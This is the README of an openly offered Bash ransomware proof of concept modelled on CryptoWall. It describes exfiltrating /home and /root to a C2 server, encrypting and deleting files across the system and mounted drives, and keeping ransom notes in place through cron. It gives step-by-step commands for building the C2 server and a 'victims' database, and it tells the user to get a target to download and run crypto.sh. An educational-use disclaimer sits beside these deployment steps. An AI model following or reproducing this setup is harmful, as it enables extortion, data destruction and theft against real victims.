# Bash Ransomware

## Synopsis
 Simple Bash POC cryptoware that is modeled after CryptoWall 3.0/4.0

## Requirements
 - openssl
 - jquery
 - mysql
 - php 5 (php5-mysql)
 - apache2 

## Features
 - Secure Comunications over HTTPS to the C2 
 - Data Exfil from the target (key, /home/, /root) - Based on Chimera Ransomware that threatens to release private documents if ransom is not paid
 - UPDATE: 12 Dec 2015 -> Filename encryption has been added (Reference: Talos CW 4.0 Report)
 - File Encryption based on a set of defined file extensions, should encrypt files in '/' and encrypt mount points (USB, NFS, etc.)

## Feature Requests
 - Unique RSA key-pair per victim
 - Move DB settings into a common.php file and refer to that file in each of the scripts (One place to edit instead of numerous places)
 - More features will go here...

## Notes
 - Python and C versions of the BashCrypt are currently in development and should be released in the near future
 - Windows executable and powershell versions are also in development
 - You may notice that the configuration is insecure (e.g. - no db password, processes running as root, etc.). This is just for testing purposes in my dev environment. If you use this in an exercise, you will want to follow best practices to secure the C2 server
 - The codebase uses newer versions of software, like PHP. You may run into environments with older versions of PHP that do not support some of the built-in PHP functions. In this case, you will have to modify the code. Specifically, I ran into a PHP version < 5.2 and the DateTime function. To resolve this, I used srtotime("now") to get the Linux Epoch time and the date function, date('Y-m-d H:i:s'), to resolve this. To resolve this, you can use something similar to the following: date('Y-m-d H:i:s', strotime("now"));

## What to do on the server-side
 - > Configure your comms over HTTPS
 - > Sample certs are in the sample_apache_conf directory
 - $ openssl genrsa -des3 -passout pass:neveruseinsecurepasswords -out server.pass.key 4096
 - $ openssl rsa -passin pass:neveruseinsecurepasswords -in server.pass.key -out server.key 
 - $ openssl req -new -key server.key -out server.csr
 - $ openssl x509 -req -days 4096 -in server.csr  -signkey server.key -out server.crt
 - $ chmod 600 server.*
 - $ mkdir /etc/ssl/certs/
 - $ mv server.key /etc/ssl/certs/
 - $ mv server.crt /etc/ssl/certs/
 - > Use the sample apache SSL and Default configurations in sample_apache_conf as a guide
 - > Then configure your apache to redirect HTTP traffic to HTTPS
 - > Enable SSL
 - $ a2enmod ssl
 - $ servive apache2 restart

 - > Start Crypto Setup
 - $ openssl genrsa -out priv.pem 4096
 - $ openssl rsa -pubout -in priv.pem -out pub.pem
 - $ mkdir -p /var/www/html/downloads
 - $ cp pub.pem /var/www/html/downloads/
 - > Modify crypto.sh and replace the IP with your web server's IP/URL
 - $ sed -i 's/192\.168\.1\.132/YYY\.YYY\.YYY\.YYY/g' crypto.sh # Where YYY.YYY.YYY.YYY is your IP
     OR
 - $ sed -i 's/192\.168\.1\.132/www\.yourdomain\.com/g' crypto.sh
 - $ cp crypto.sh /var/www/html/downloads/
 - > Copy all of the ransomware files to /var/www/html
 - > You should have all of the php files in the root of your web dir (/var/www/html/)
 - > You should also have /var/www/html/images/ and /var/www/html/scripts/
 - $ cd /var/www/html/
 - > Modify admin.php, admin_query.php, decrypt.php, query.php, count.php, and target.php with your database information
 - $ chown -R www-data:root /var/www/html/
 - > Next, create the database for storing the data
 - $ mysql -u [user] -p
 - $ create database victims;
 - $ use victims;
 - $ create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), file_count int not null, curr_time timestamp not null, exp_time timestamp not null, time_expired bool not null, paid bool not null, paid_count timestamp not null);
 - $ exit

## What to do on the client-side
 - Get target to download the file and execute or if you have have access to the system, download it directly
 - $ chmod 755 crypto.sh
 - $ ./crypto.sh &

## What it does
 - Downloads the public key from our server 
 - Generates a key file on the target
 - Loops through the system for files with the defined extensions and Uses AES-256 to encrypt the files on the system using the generated key
 - Deletes the original file, leaving only the encrypted file
 - The key file is then encrypted using the public key (RSA-4096)
 - Prints a ransom message and then persists that message through cron
 - In each dir, an INSTRUCTIONS.txt file is created and contains the ransome message
 - Links to a web page where the user can see an active countdown of the time that is left before key deletion

## Acknowledgements/Contributors
  - Special thanks to zmallen and his lollocker (https://github.com/zmallen/lollocker)
  - lollocker served as the inspiration for this project
  - CryptoWall message text used came from https://www.pcrisk.com/removal-guides/7844-cryptowall-virus

## Sources
  - Excellent CryptoWall 3.0 Writeup: http://blog.brillantit.com/?p=15
  - CryptoWall 3.0 Writeup: http://www.sentinelone.com/blog/anatomy-of-cryptowall-3-0-a-look-inside-ransomwares-tactics/
  - Chimera Ransomware: https://threatpost.com/chimera-ransomware-promises-to-publish-encrypted-data-online/115293/
  - CryptoWall 4.0: http://securityaffairs.co/wordpress/41718/cyber-crime/cryptowall-4-0-released.html
  - CryptoWall 4.0 DECRYPT.html: http://www.bleepstatic.com/images/news/ransomware/cryptowall/v4/note-part-1.jpg
  - Talos CryptoWall 4.0 Report: http://blog.talosintel.com/2015/12/cryptowall-4.html

## WARNING 
  - Use this tool at your own risk. Author is not responsible or liable if you damage your own system or others. Follow all local, state, federal, and international laws as it pertains to your geographic location. Do NOT use this tool maliciously as it is being released for educational purposes. This tools intended use is in cyber exercises or demonstrations of adversarial tools.

## Screenshots

   - Infected: <br />
   ![Infected](/screenshots/infected.jpg?raw=true "Infected") <br />
   - Encrypted Filenames: <br />
   ![Filenames](/screenshots/filename_encrypt.jpg?raw=true "Filenames") <br />
   - Instructions: <br />
   ![Instructions 1](/screenshots/INSTRUCTIONS_1.jpg?raw=true "Instructions 1") <br />
   ![Instructions 2](/screenshots/INSTRUCTIONS_2.jpg?raw=true "Instructions 2") <br />
   - Decryption Page: <br />
   ![Decrypt](/screenshots/decrypt_page.jpg?raw=true "Decrypt") <br />
   - Countdown: <br />
   ![Countdown](/screenshots/time_countdown.jpg?raw=true "Countdown") <br />
   - Admin: <br />
   ![Admin](/screenshots/admin_portal.jpg?raw=true "Admin") <br />
   - Payment (Time Remaining): <br />
   ![Payment1](/screenshots/payment1.jpg?raw=true "Payment1") <br />
   - Payment (Time Expired): <br />
   ![Payment2](/screenshots/payment2.jpg?raw=true "Payment2") <br />
   - After Payment (2 Hour Wait): <br />
   ![AfterPayment1](/screenshots/Decryption_After_Payment_1.jpg?raw=true "AfterPayment1") <br />
   - After Payment (Downloads Available): <br />
   ![AfterPayment2](/screenshots/Decryption_After_Payment_2.jpg?raw=true "AfterPayment2") <br />
